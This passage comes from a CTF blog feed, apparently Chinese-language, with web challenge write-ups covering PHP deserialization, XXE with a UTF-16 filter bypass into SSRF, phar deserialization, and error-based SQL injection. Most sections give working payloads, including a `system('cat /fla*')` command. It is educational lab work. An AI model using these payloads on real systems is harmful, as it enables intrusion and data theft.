class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="string">&quot;&lt;?php class hacker&#123;public function hack()&#123;echo &#x27;hack the hack!I believe you can!&#x27;;&#125;&#125;\$hack=&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;contents=<span class="string">&quot;&#x27;a&#x27;;?&gt;&lt;?php phpinfo() ?&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method=<span class="string">&quot;\$hack-&gt;hack();&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> preload()));</span><br></pre></td></tr></table></figure><p>将生成的载荷以参数 <code>a</code> 提交给 preload 的同时条件竞争访问 hack.php 即有机会触发到 phpinfo。可以得到如下 disable_functions 列表。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,</span><br></pre></td></tr></table></figure><p>可以发现其中没有过滤 <code>system()</code>，因此只需要拼接一下即可运行从而得到 flag。构造出如下载荷。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">implode([<span class="string">&quot;sys&quot;</span>, <span class="string">&quot;tem&quot;</span>])(<span class="string">&quot;cat /fla*&quot;</span>)</span><br></pre></td></tr></table></figure><p>将其拼接在 <code>$this-&gt;contents</code> 中重新生成载荷然后条件竞争即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7b154242-df8e-47df-81dd-4807644335fa&#125;</span><br></pre></td></tr></table></figure><h3 id="xx-elogin"><a href="#xx-elogin" class="headerlink" title="xx_elogin"></a>xx_elogin</h3><p>登录页面的源码可以看出 <code>/api.php</code> 的 XXE，简单构造出如下载荷读取文件。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;&quot;</span> <span class="meta-string">&quot;php://filter/convert.base64-encode/resource=api.php&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以读到如下源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="comment">// 哈哈，我数据库都不用你还能秒我。</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span> === <span class="string">&#x27;guest&#x27;</span> &amp;&amp; <span class="variable">$password</span> === <span class="string">&#x27;guest111222333444555666@#$!&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    header(<span class="string">&quot;Location:guest.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$username</span> === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$password</span> === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">    <span class="comment">// 仅允许管理员从本地访问，这样总安全了吧！！！</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;admin.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;username or password error&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以得到两份密码，同时考虑使用 SSRF 来登录管理员账户，因此考虑使用 XXE 来进行 SSRF。可以发现如下过滤。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/system/i&#x27;</span>,<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker go out!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http/i&#x27;</span>,<span class="variable">$xmlfile</span>) &amp;&amp; preg_match(<span class="string">&#x27;/dtd|ENTITY/i&#x27;</span>,<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;禁止出网&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>,LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$result</span> = simplexml_import_dom(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$result</span> = sprintf(<span class="string">&quot;&lt;result&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="variable">$result</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此时可以使用 UTF-16 编码来绕过判断从而达成 SSRF。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$REAL_PAYLOAD</span> = <span class="string">&quot;http://127.0.0.1:80/login.php&quot;</span>;</span><br><span class="line"><span class="variable">$XXE_PAYLOAD</span> = <span class="comment">/** <span class="doctag">@lang</span> text */</span></span><br><span class="line">    &lt;&lt;&lt;PAYLOAD</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">  &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">  &lt;!ENTITY xxe <span class="keyword">PUBLIC</span> <span class="string">&quot;123&quot;</span> <span class="string">&quot;PAYLOAD&quot;</span> &gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line">PAYLOAD;</span><br><span class="line"><span class="variable">$XXE_PAYLOAD</span> = str_replace(<span class="string">&quot;PAYLOAD&quot;</span>, <span class="variable">$REAL_PAYLOAD</span>, <span class="variable">$XXE_PAYLOAD</span>);</span><br><span class="line"><span class="variable">$XXE_PAYLOAD</span> = iconv(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;utf-16&#x27;</span>, <span class="variable">$XXE_PAYLOAD</span>);</span><br></pre></td></tr></table></figure><p>此时生成出来的载荷即可成功 SSRF。结合如下代码里的文件上传和管理员登录后的 <code>readgzfile()</code> 函数的调用，考虑触发利用 phar 反序列化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] !== <span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;you don&#x27;t have permission&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;welcome guest&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;图片库&lt;/h2&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;p&gt;既然来了，就留下点什么吧(ಡωಡ)hiahiahia&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;guest.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;pic&quot;</span>&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;pic&quot;</span> id=<span class="string">&quot;pic&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;upload&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_size</span> &gt; <span class="number">2</span>*<span class="number">1024</span>*<span class="number">1024</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;pic too long&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> != <span class="string">&#x27;image/jpeg&#x27;</span> &amp;&amp; <span class="variable">$file_type</span> != <span class="string">&#x27;image/gif&#x27;</span> &amp;&amp; <span class="variable">$file_type</span> != <span class="string">&#x27;image/png&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;file type error&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$ext</span> = end(explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="variable">$ext</span>,<span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;file ext error&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(is_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$upload_file</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$user_path</span> = <span class="string">&#x27;./uploads/&#x27;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = time().rand(<span class="number">1</span>,<span class="number">100</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$ext</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$user_path</span>.<span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$user_path</span>.<span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;hint = <span class="string">&#x27;readfile&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;flag = getenv(<span class="string">&#x27;ICQ_FLAG&#x27;</span>);</span><br><span class="line">            <span class="variable">$what_you_want</span> = <span class="keyword">$this</span>-&gt;flag;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&#x27;$flag&#x27;</span>.<span class="string">&#x27;= create_function(&quot;&quot;,\&#x27;echo &quot;&#x27;</span> . <span class="variable">$what_you_want</span> . <span class="string">&#x27;&quot;;\&#x27;);&#x27;</span>);</span><br><span class="line">            <span class="variable">$hint</span> = <span class="keyword">$this</span>-&gt;hint;</span><br><span class="line">            <span class="variable">$hint</span>(<span class="string">&#x27;hinttttttttttttttttttttttttttttttt.txt&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] !== <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;only admin can see flag&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] === <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;welcome admin!!!&#x27;</span>;</span><br><span class="line">        <span class="comment">// $secret = new secret();</span></span><br><span class="line">        <span class="variable">$dir</span> = scandir(<span class="string">&#x27;./uploads&#x27;</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$dir</span>[<span class="number">0</span>]);<span class="keyword">unset</span>(<span class="variable">$dir</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$beautiful</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;jpg&#x27;</span>];</span><br><span class="line">        <span class="variable">$flag_pic</span> = <span class="variable">$beautiful</span> ? <span class="variable">$beautiful</span>:<span class="variable">$dir</span>[array_rand(<span class="variable">$dir</span>,<span class="number">1</span>)];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/^phar|smtp|compress|dict|zip|file|etc|root|filter|php|flag|ctf|hint|\.\.\//i&quot;</span>,<span class="variable">$flag_pic</span>))&#123;</span><br><span class="line">            chdir(<span class="string">&#x27;./uploads&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span>(readgzfile(<span class="variable">$flag_pic</span>))&#123;</span><br><span class="line">                copy(<span class="variable">$flag_pic</span>,<span class="string">&#x27;../lovestpic/lovest_&#x27;</span>.time().<span class="string">&#x27;.pic&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因为代码中只有一个类，因此考虑利用这个类。代码中匿名函数的创建提供了利用点，因为匿名函数实际上有名称为 <code>%00lambda_\d</code> 的默认名称。因此只需要让 <code>$hint</code> 取到匿名函数的默认名称即可触发匿名函数读取到环境变量中的 flag。构造出如下脚本来生成 phar 载荷。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">MakePhar</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Phar</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;hint = urldecode(<span class="string">&quot;%00lambda_3&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">MakePhar</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;EXP.phar&quot;</span>);</span><br><span class="line">        <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">        <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$phar</span>-&gt;setMetadata(<span class="keyword">new</span> secret());</span><br><span class="line">        <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;actuallyNothingHere&quot;</span>);</span><br><span class="line">        <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将生成的载荷以 jpg 拓展名作为图片上传，然后 SSRF 到 <code>?username=admin&amp;password=admin&amp;jpg=zlib:phar://&#123;$filename&#125;</code> 触发文件的解压即可触发到 phar 反序列化从而得到 flag。</p>]]></content:encoded>
      
      
      
      
      <comments>https://lemonprefect.cn/zh-CN/posts/f43e78a1.html#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>CISCN Quals 2021</title>
      <link>https://lemonprefect.cn/zh-CN/posts/7c083fa1.html</link>
      <guid>https://lemonprefect.cn/zh-CN/posts/7c083fa1.html</guid>
      <pubDate>Sun, 16 May 2021 07:16:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&quot;easy-sql&quot;&gt;&lt;a href=&quot;#easy-sql&quot; class=&quot;headerlink&quot; title=&quot;easy_sql&quot;&gt;&lt;/a&gt;easy_sql&lt;/h3&gt;&lt;p&gt;稍微尝试发现 union 和 sys 被禁用，同时可以发现报错回显。因此尝试报错注入配合无列名注入。猜测存在一个 flag 表，构造如下载荷得到列名。&lt;/p&gt;
&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h3><p>稍微尝试发现 union 和 sys 被禁用，同时可以发现报错回显。因此尝试报错注入配合无列名注入。猜测存在一个 flag 表，构造如下载荷得到列名。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Submit<span class="operator">=</span><span class="operator">%</span>E7<span class="operator">%</span><span class="number">99</span><span class="operator">%</span>BB<span class="operator">%</span>E5<span class="operator">%</span>BD<span class="operator">%</span><span class="number">95</span><span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="keyword">null</span><span class="string">&#x27;) or extractvalue(1,concat(0x7e,(select * from(select * from flag a join (select * from flag)b using(id,no))c),0x7e)) %23&amp;uname=1111</span></span><br></pre></td></tr></table></figure><p>得到如下列名。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Duplicate column name &#39;4a9ad912-9910-4909-82f4-0fe381be9798&#39;</span><br></pre></td></tr></table></figure><p>再次构造如下载荷分别读出两半 flag。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Submit<span class="operator">=</span><span class="operator">%</span>E7<span class="operator">%</span><span class="number">99</span><span class="operator">%</span>BB<span class="operator">%</span>E5<span class="operator">%</span>BD<span class="operator">%</span><span class="number">95</span><span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="keyword">null</span><span class="string">&#x27;) or extractvalue(1,concat(0x7e,((select `4a9ad912-9910-4909-82f4-0fe381be9798`  from flag)),0x7e)) %23&amp;uname=1111\</span></span><br></pre></td></tr></table></figure><p>得到结果是 <code>XPATH syntax error: &#39;~CISCN&#123;x4lPe-j6y1T-ThuQ3-Dhd30-Z&#39;</code>。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Submit<span class="operator">=</span><span class="operator">%</span>E7<span class="operator">%</span><span class="number">99</span><span class="operator">%</span>BB<span class="operator">%</span>E5<span class="operator">%</span>BD<span class="operator">%</span><span class="number">95</span><span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="keyword">null</span><span class="string">&#x27;) or extractvalue(1,concat(0x7e,(select substr((select `4a9ad912-9910-4909-82f4-0fe381be9798`  from flag),12)),0x7e)) %23&amp;uname=1111</span></span><br></pre></td></tr></table></figure><p>得到结果是 <code>XPATH syntax error: &#39;~-j6y1T-ThuQ3-Dhd30-ZlZSt-&#125;~&#39;</code>。将两段 flag 拼合即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CISCN&#123;x4lPe-j6y1T-ThuQ3-Dhd30-ZlZSt-&#125;</span><br></pre></td></tr></table></figure><h3 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h3><p>题目给出的源码如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;your flag is in some file in /etc &quot;</span>;</span><br><span class="line">    <span class="variable">$fielf</span>=<span class="variable">$_POST</span>[<span class="string">&quot;field&quot;</span>];</span><br><span class="line">    <span class="variable">$cf</span>=<span class="string">&quot;/tmp/app_auth/cfile/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;cf&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$cf</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$cf</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$$field</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以发现存在一个可控的文件包含，同时 flag 位于 <code>/etc</code> 目录下的文件夹中。同时很容易发现存在 